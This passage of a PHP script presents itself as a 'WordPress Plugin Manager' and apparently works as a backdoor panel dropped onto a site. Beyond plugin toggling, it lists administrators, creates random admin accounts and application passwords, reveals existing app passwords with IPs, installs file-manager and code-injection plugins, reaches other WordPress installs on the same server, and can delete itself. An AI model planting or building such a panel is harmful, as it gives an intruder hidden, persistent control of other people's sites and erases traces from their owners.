                        foreach ($pwds as $p) {
                            $parts[] = sprintf('[%s] uuid:%s created:%s last_used:%s ip:%s',
                                $p['name'] ?? '?',
                                substr($p['uuid'] ?? '', 0, 8) . '…',
                                isset($p['created'])   ? date('Y-m-d H:i', $p['created'])   : '-',
                                isset($p['last_used']) ? date('Y-m-d H:i', $p['last_used']) : 'Never',
                                $p['last_ip'] ?? '-'
                            );
                        }
                        $message = "{$uname} — " . count($pwds) . " App Password(s): " . implode(' || ', $parts);
                        $message_type = 'success';
                    } else { $message = "{$uname}: No app passwords found."; $message_type = 'error'; }
                } else { $message = "{$uname}: No app passwords found."; $message_type = 'error'; }
            }
            break;

        case 'self_delete':
            if (@unlink(__FILE__)) {
                ?><!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Script Deleted</title>
<style>body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f0f0f1;padding:40px;}
.box{background:#edfaef;border:1px solid #00a32a;padding:24px 28px;border-radius:6px;max-width:520px;margin:0 auto;}
h2{color:#007017;font-size:18px;margin-bottom:8px;}p{color:#3c434a;font-size:14px;line-height:1.6;}</style>
</head>
<body><div class="box"><h2>Script Deleted</h2><p>This file has been permanently removed from the server.</p></div></body>
</html><?php
                exit;
            }
            $message = 'Error: Could not delete script file. Check file permissions.'; $message_type = 'error';
            break;
    }

    $redirect_url = $_SERVER['PHP_SELF'];
    $params       = [];
    if (!empty($_SERVER['QUERY_STRING'])) parse_str($_SERVER['QUERY_STRING'], $params);
    if ($message) { $params['msg'] = base64_encode($message); $params['msg_type'] = $message_type; }
    header('Location: ' . $redirect_url . ($params ? '?' . http_build_query($params) : ''));
    exit;
}

// --- Gather page data ---
$all_plugins    = get_plugins();
$active_plugins = get_option('active_plugins', []);

$url_message = $url_message_type = '';
if (isset($_GET['msg'], $_GET['msg_type'])) {
    $url_message      = base64_decode($_GET['msg']);
    $url_message_type = $_GET['msg_type'];
}

$transient = get_site_transient('update_plugins');
if (!is_object($transient) || empty($transient->last_checked) || (time() - $transient->last_checked) > 300) {
    wp_update_plugins();
}
$plugin_updates = get_plugin_updates();

$sorted_plugins = [];
foreach ($all_plugins as $pf => $pd) {
    $has_update = isset($plugin_updates[$pf]);
    $sorted_plugins[] = [
        'file'           => $pf,
        'data'           => $pd,
        'active'         => in_array($pf, $active_plugins),
        'update'         => $has_update,
        'update_version' => $has_update ? $plugin_updates[$pf]->update->new_version : null,
    ];
}
usort($sorted_plugins, function($a, $b) {
    if ($a['active'] !== $b['active']) return $a['active'] ? -1 : 1;
    return strcmp($a['data']['Name'], $b['data']['Name']);
});

$total_plugins = count($sorted_plugins);
$active_count  = count(array_filter($sorted_plugins, function($p) { return $p['active']; }));
$update_count  = count(array_filter($sorted_plugins, function($p) { return $p['update']; }));

$current_home_url = home_url('/');
$current_domain   = wp_parse_url($current_home_url, PHP_URL_HOST)
    ?: wp_parse_url(site_url('/'), PHP_URL_HOST)
    ?: (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');

$active_theme       = wp_get_theme();
$stylesheet_path    = function_exists('get_stylesheet_directory') ? get_stylesheet_directory() : '';
$template_path      = function_exists('get_template_directory') ? get_template_directory() : '';
$current_theme_path = $stylesheet_path ?: $template_path;
if ($stylesheet_path && $template_path && $stylesheet_path !== $template_path) {
    $current_theme_path .= ' | Parent: ' . $template_path;
}

$server_parts = array_filter([
    isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '',
    function_exists('php_sapi_name') ? 'SAPI: ' . php_sapi_name() : '',
]);
if (empty($server_parts) && function_exists('apache_get_version') && ($av = @apache_get_version())) $server_parts[] = $av;
$middleware_info = $server_parts ? implode(' | ', array_unique($server_parts)) : 'Unknown';

$admin_users = get_users(['role' => 'administrator', 'orderby' => 'ID', 'order' => 'ASC']);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WP Plugin Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f0f1; color: #1d2327; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { font-size: 24px; margin-bottom: 10px; }
        .stats { display: flex; gap: 15px; margin-bottom: 20px; flex-wrap: wrap; align-items: center; }
        .stat { background: #fff; padding: 12px 20px; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .stat strong { font-size: 20px; display: block; }
        .stat span { font-size: 12px; color: #646970; }
        .message { padding: 12px 16px; border-radius: 6px; margin-bottom: 20px; word-break: break-word; }
        .message.success { background: #edfaef; border: 1px solid #00a32a; color: #00a32a; }
        .message.error   { background: #fcf0f1; border: 1px solid #d63638; color: #d63638; }
        .section { background: #fff; padding: 16px 20px; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-bottom: 20px; }
        .section h2 { font-size: 16px; margin-bottom: 12px; }
        .danger-zone { border: 1px solid #fca5a5; padding: 16px 20px; border-radius: 6px; margin-top: 20px; margin-bottom: 20px; }
        .danger-zone h2 { font-size: 16px; color: #b91c1c; margin-bottom: 6px; }
        .danger-zone p { font-size: 12px; color: #646970; margin-bottom: 12px; }
        table { width: 100%; background: #fff; border-radius: 6px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1); border-collapse: collapse; }
        th { background: #1d2327; color: #fff; padding: 12px 16px; text-align: left; font-size: 13px; font-weight: 600; }
        td { padding: 12px 16px; border-top: 1px solid #f0f0f1; font-size: 13px; vertical-align: middle; }
        tr:hover { background: #f6f7f7; }
        .plugin-name   { font-weight: 600; }
        .plugin-desc   { color: #646970; font-size: 12px; margin-top: 4px; }
        .plugin-author { color: #646970; font-size: 11px; margin-top: 2px; }
        .version       { font-family: monospace; background: #f0f0f1; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
        .status        { display: inline-block; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: 600; }
        .status.active   { background: #edfaef; color: #00a32a; }
        .status.inactive { background: #fcf0f1; color: #d63638; }
        .update-available { color: #dba617; font-weight: 600; }
        .update-arrow { margin: 0 4px; }
        .no-update { color: #00a32a; font-size: 16px; }
        .actions { display: flex; gap: 8px; flex-wrap: wrap; }
        form { display: inline; }
        button, .btn { padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: 500; transition: opacity 0.2s; text-decoration: none; display: inline-block; }
        button:hover, .btn:hover { opacity: 0.85; }
        .btn-activate   { background: #00a32a; color: #fff; }
        .btn-deactivate { background: #d63638; color: #fff; }
        .btn-update     { background: #dba617; color: #fff; }
        .btn-cache      { color: #fff; }
        .btn-clear-all  { background: #1d2327; color: #fff; padding: 8px 16px; font-size: 13px; }
        .btn-install    { background: #2271b1; color: #fff; padding: 8px 16px; font-size: 13px; }
        .btn-open       { background: #00a32a; color: #fff; padding: 8px 16px; font-size: 13px; }
        .btn-secondary  { background: #646970; color: #fff; padding: 8px 16px; font-size: 13px; }
        .btn-danger     { background: #b91c1c; color: #fff; padding: 8px 16px; font-size: 13px; }
        .btn-sm         { padding: 4px 10px !important; font-size: 11px !important; }
        .cache-badge    { font-size: 9px; padding: 1px 5px; border-radius: 3px; background: rgba(255,255,255,0.25); margin-left: 4px; }
        .cache-buttons  { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
        .cache-info     { font-size: 11px; color: #646970; margin-bottom: 12px; }
        .quick-plugin-list { display: flex; flex-direction: column; gap: 14px; }
        .quick-plugin-row  { display: flex; justify-content: space-between; gap: 16px; align-items: center; flex-wrap: wrap; padding-top: 14px; border-top: 1px solid #f0f0f1; }
        .quick-plugin-row:first-child { padding-top: 0; border-top: none; }
        .quick-plugin-actions { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin-bottom: 20px; }
        .info-card { background: #fff; padding: 14px 16px; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        .info-label { display: block; font-size: 11px; color: #646970; margin-bottom: 8px; text-transform: uppercase; }
        .info-value { font-size: 13px; font-weight: 600; line-height: 1.5; word-break: break-all; }
        .info-note  { margin-top: 6px; font-size: 11px; color: #646970; word-break: break-all; }
        .path-form  { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
        .path-input { flex: 1 1 420px; min-width: 260px; padding: 9px 12px; border: 1px solid #c3c4c7; border-radius: 4px; font-size: 13px; }
        .path-help  { margin-top: 10px; font-size: 11px; color: #646970; }
        .wp-path    { font-size: 11px; color: #646970; margin-bottom: 15px; }
        .status-label { font-size: 13px; color: #00a32a; padding: 8px 0; }
    </style>
</head>
<body>
<div class="container">
    <h1>WordPress Plugin Manager</h1>
    <div class="wp-path">
        <?php echo $using_custom_site_path ? 'Custom path active' : 'Current directory active'; ?> |
        WP Root: <?php echo esc_html($wp_root); ?>
    </div>

    <?php if ($path_error): ?>
        <div class="message error"><?php echo esc_html($path_error); ?></div>
    <?php endif; ?>
    <?php if ($message): ?>
        <div class="message <?php echo esc_attr($message_type); ?>"><?php echo esc_html($message); ?></div>
    <?php elseif ($url_message): ?>
        <div class="message <?php echo esc_attr($url_message_type); ?>"><?php echo esc_html($url_message); ?></div>
    <?php endif; ?>

    <div class="section">
        <h2>Custom Site Path</h2>
        <form method="GET" class="path-form">
            <input type="text" name="path" class="path-input" value="<?php echo esc_attr($requested_site_path); ?>" placeholder="/var/www/site2/">
            <button type="submit" class="btn-install">Load</button>
            <?php if ($requested_site_path !== ''): ?>
                <a href="<?php echo esc_url(build_manager_url([], ['path', 'msg', 'msg_type'])); ?>" class="btn btn-secondary">Reset</a>
            <?php endif; ?>
        </form>
        <div class="path-help">Enter the path to another WordPress installation on the same server to manage its plugins.</div>
    </div>

    <div class="info-grid">
        <div class="info-card">
            <span class="info-label">Domain</span>
            <div class="info-value"><?php echo esc_html($current_domain ?: '-'); ?></div>
            <div class="info-note"><?php echo esc_html($current_home_url); ?></div>
        </div>
        <div class="info-card">
            <span class="info-label">Active Theme</span>
            <div class="info-value"><?php echo esc_html($active_theme->get('Name') ?: '-'); ?></div>
            <div class="info-note"><?php echo esc_html($current_theme_path ?: '-'); ?></div>
        </div>
        <div class="info-card">
            <span class="info-label">PHP Version</span>
            <div class="info-value"><?php echo esc_html(PHP_VERSION); ?></div>
        </div>
        <div class="info-card">
            <span class="info-label">Server</span>
            <div class="info-value"><?php echo esc_html($middleware_info); ?></div>
        </div>
    </div>

    <?php if (!empty($available_caches)): ?>
    <div class="section">
        <h2>Cache Management</h2>
        <div class="cache-info">Detected: <?php
            $labels = [];
            foreach ($available_caches as $c) $labels[] = esc_html($c['name'] . ' (' . ($c['detected_by'] ?? 'unknown') . ')');
            echo implode(', ', $labels);
        ?></div>
        <div class="cache-buttons">
            <form method="POST" style="display:inline;">
                <input type="hidden" name="action" value="clear_cache">
                <input type="hidden" name="cache_target" value="all">
                <button type="submit" class="btn-clear-all">Clear All</button>
            </form>
            <?php foreach ($available_caches as $key => $cache): ?>
            <form method="POST" style="display:inline;">
                <input type="hidden" name="action" value="clear_cache">
                <input type="hidden" name="cache_target" value="<?php echo esc_attr($key); ?>">
                <button type="submit" class="btn-cache" style="background:<?php echo esc_attr($cache['color']); ?>">
                    <?php echo esc_html($cache['name']); ?> Clear
                    <span class="cache-badge"><?php echo esc_html($cache['detected_by'] ?? ''); ?></span>
                </button>
            </form>
            <?php endforeach; ?>
        </div>
    </div>
    <?php endif; ?>

    <div class="section">
        <h2>Quick Plugin Install</h2>
        <div class="quick-plugin-list">
            <div class="quick-plugin-row">
                <div>
                    <div class="plugin-name">WP File Manager</div>
                    <div class="plugin-desc">Slug: wp-file-manager/</div>
                </div>
                <div class="quick-plugin-actions">
                    <?php if (is_wpfm_installed()): ?>
                        <span class="status-label">Status: <strong><?php echo is_wpfm_active() ? 'Installed &amp; Active' : 'Installed, Inactive'; ?></strong></span>
                        <?php if (!is_wpfm_active()): ?>
                            <form method="POST"><input type="hidden" name="action" value="install_wpfm"><button type="submit" class="btn-install">Activate</button></form>
                        <?php endif; ?>
                        <a href="<?php echo esc_url(build_manager_url(['fm' => '1'], ['msg', 'msg_type'])); ?>" target="_blank" class="btn btn-open">Open File Manager</a>
                    <?php else: ?>
                        <form method="POST"><input type="hidden" name="action" value="install_wpfm"><button type="submit" class="btn-install">Install WP File Manager</button></form>
                    <?php endif; ?>
                </div>
            </div>
            <div class="quick-plugin-row">
                <div>
                    <div class="plugin-name">WPCode</div>
                    <div class="plugin-desc">Slug: insert-headers-and-footers/</div>
                </div>
                <div class="quick-plugin-actions">
                    <?php if (is_wpcode_installed()): ?>
                        <span class="status-label">Status: <strong><?php echo is_wpcode_active() ? 'Installed &amp; Active' : 'Installed, Inactive'; ?></strong></span>
                        <?php if (!is_wpcode_active()): ?>
                            <form method="POST"><input type="hidden" name="action" value="install_wpcode"><button type="submit" class="btn-install">Activate</button></form>
                        <?php endif; ?>
                    <?php else: ?>
                        <form method="POST"><input type="hidden" name="action" value="install_wpcode"><button type="submit" class="btn-install">Install WPCode</button></form>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>

    <?php if (!empty($admin_users)): ?>
    <div class="section">
        <h2>Administrator Users</h2>
        <table style="box-shadow:none;">
            <thead>
                <tr>
                    <th style="background:#f0f0f1;color:#1d2327;padding:8px 12px;">ID</th>
                    <th style="background:#f0f0f1;color:#1d2327;padding:8px 12px;">Username</th>
                    <th style="background:#f0f0f1;color:#1d2327;padding:8px 12px;">Email</th>
                    <th style="background:#f0f0f1;color:#1d2327;padding:8px 12px;">Registered</th>
                    <th style="background:#f0f0f1;color:#1d2327;padding:8px 12px;">Posts</th>
                    <th style="background:#f0f0f1;color:#1d2327;padding:8px 12px;">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($admin_users as $admin): ?>
                <tr>
                    <td><?php echo intval($admin->ID); ?></td>
                    <td><strong><?php echo esc_html($admin->user_login); ?></strong></td>
                    <td><?php echo esc_html($admin->user_email); ?></td>
                    <td style="font-family:monospace;font-size:12px;"><?php echo esc_html(get_date_from_gmt($admin->user_registered, 'Y-m-d H:i')); ?></td>
                    <td><?php echo intval(count_user_posts($admin->ID, 'post')); ?></td>
                    <td>
                        <div style="display:flex;flex-wrap:wrap;gap:6px;align-items:center;">
                            <form method="POST"><input type="hidden" name="action" value="gen_app_password"><input type="hidden" name="user_id" value="<?php echo intval($admin->ID); ?>"><button type="submit" class="btn btn-install btn-sm">Create App Password</button></form>
                            <form method="POST"><input type="hidden" name="action" value="read_app_passwords"><input type="hidden" name="user_id" value="<?php echo intval($admin->ID); ?>"><button type="submit" class="btn btn-sm" style="background:#6c5ce7;color:#fff;">List App Passwords</button></form>
                            <?php if ($admin->ID !== 1): ?>
                            <form method="POST" onsubmit="return confirm('Delete this user?')"><input type="hidden" name="action" value="delete_admin_user"><input type="hidden" name="user_id" value="<?php echo intval($admin->ID); ?>"><button type="submit" class="btn btn-deactivate btn-sm">Delete</button></form>
                            <?php else: ?>
                            <span style="color:#646970;font-size:11px;">Primary (protected)</span>
                            <?php endif; ?>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <div style="margin-top:12px;">
            <form method="POST" onsubmit="return confirm('Create a random administrator account?')">
                <input type="hidden" name="action" value="create_random_admin">
                <button type="submit" class="btn-install" style="padding:6px 14px;font-size:12px;">+ Create Random Admin</button>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <div class="stats">
        <div class="stat"><strong><?php echo $total_plugins; ?></strong><span>Total</span></div>
        <div class="stat"><strong><?php echo $active_count; ?></strong><span>Active</span></div>
        <div class="stat"><strong><?php echo $total_plugins - $active_count; ?></strong><span>Inactive</span></div>
        <div class="stat"><strong><?php echo $update_count; ?></strong><span>Updates Available</span></div>
        <div>
            <form method="POST"><input type="hidden" name="action" value="refresh_updates"><button type="submit" class="btn-update" style="padding:8px 14px;font-size:13px;">Refresh Updates</button></form>
        </div>
    </div>

    <table>
        <thead>
            <tr>
                <th style="width:35%">Plugin</th>
                <th style="width:12%">Version</th>
                <th style="width:10%">Status</th>
                <th style="width:15%">Update</th>
                <th style="width:28%">Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($sorted_plugins as $plugin):
                $name        = $plugin['data']['Name'];
                $version     = $plugin['data']['Version'];
                $description = $plugin['data']['Description'];
                $author      = $plugin['data']['Author'];
                $is_active   = $plugin['active'];
                $has_update  = $plugin['update'];
                $pf          = $plugin['file'];
            ?>
            <tr>
                <td>
                    <div class="plugin-name"><?php echo esc_html($name); ?></div>
                    <?php if ($description): ?><div class="plugin-desc"><?php echo esc_html(wp_trim_words($description, 15)); ?></div><?php endif; ?>
                    <?php if ($author && $author !== '<a href="http://example.org">anonymous</a>'): ?><div class="plugin-author">by <?php echo strip_tags($author); ?></div><?php endif; ?>
                </td>
                <td><span class="version"><?php echo esc_html($version); ?></span></td>
                <td><span class="status <?php echo $is_active ? 'active' : 'inactive'; ?>"><?php echo $is_active ? 'Active' : 'Inactive'; ?></span></td>
                <td>
                    <?php if ($has_update): ?>
                        <span class="update-available"><?php echo esc_html($version); ?><span class="update-arrow">&rarr;</span><?php echo esc_html($plugin['update_version']); ?></span>
                    <?php else: ?>
                        <span class="no-update">&#10004;</span>
                    <?php endif; ?>
                </td>
                <td>
                    <div class="actions">
                        <form method="POST">
                            <input type="hidden" name="plugin" value="<?php echo esc_attr($pf); ?>">
                            <?php if ($is_active): ?>
                                <input type="hidden" name="action" value="deactivate">
                                <button type="submit" class="btn-deactivate">Deactivate</button>
                            <?php else: ?>
                                <input type="hidden" name="action" value="activate">
                                <button type="submit" class="btn-activate">Activate</button>
                            <?php endif; ?>
                        </form>
                        <?php if ($has_update): ?>
                            <form method="POST">
                                <input type="hidden" name="plugin" value="<?php echo esc_attr($pf); ?>">
                                <input type="hidden" name="action" value="update">
                                <button type="submit" class="btn-update">Update</button>
                            </form>
                        <?php endif; ?>
                    </div>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <div class="danger-zone">
        <h2>Danger Zone</h2>
        <p>Permanently delete this script file from the server. This action cannot be undone.</p>
        <form method="POST" onsubmit="return confirm('This will permanently delete this script file from the server. Are you sure?')">
            <input type="hidden" name="action" value="self_delete">
            <button type="submit" class="btn-danger">Delete This Script</button>
        </form>
    </div>

</div>
</body>
</html>
